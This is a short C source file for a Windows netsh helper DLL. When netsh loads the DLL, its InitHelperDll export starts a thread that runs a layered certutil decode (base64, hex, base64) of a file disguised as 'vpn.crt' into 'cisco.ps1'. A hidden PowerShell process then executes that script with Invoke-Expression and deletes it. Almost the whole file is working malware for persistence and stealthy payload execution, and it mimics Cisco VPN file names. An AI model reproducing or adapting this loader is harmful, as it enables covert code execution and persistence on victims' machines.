#include <stdio.h>
#include <windows.h>

DWORD WINAPI YahSure(LPVOID lpParameter)
{
//NetSh helper dll that decodes a powershell payload(vpn.crt) with certutil.exe
   system("@echo off && SET YAH=C:\\Users\\Public\\cisco.ps1 && \
	FOR %Y IN (C:\\Users\\Public\\vpn.crt) DO certutil -f -decode %Y %YAH% >nul 2>nul && \
	FOR %A IN (%YAH%) DO certutil -f -decodehex %A %YAH% >nul 2>nul && \
	FOR %H IN (%YAH%) DO certutil -f -decode %H %YAH% >nul 2>nul && \
	start powershell.exe -win hidden -nonI -nopro $bang = Get-Content %YAH%; del %YAH%; Invoke-Expression $bang");

   return 1;
}

//Custom netsh helper format
extern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID pReserved)
{
	HANDLE hand;
	hand = CreateThread(NULL, 0, YahSure, NULL, 0, NULL);
	CloseHandle(hand);

	return NO_ERROR;
}
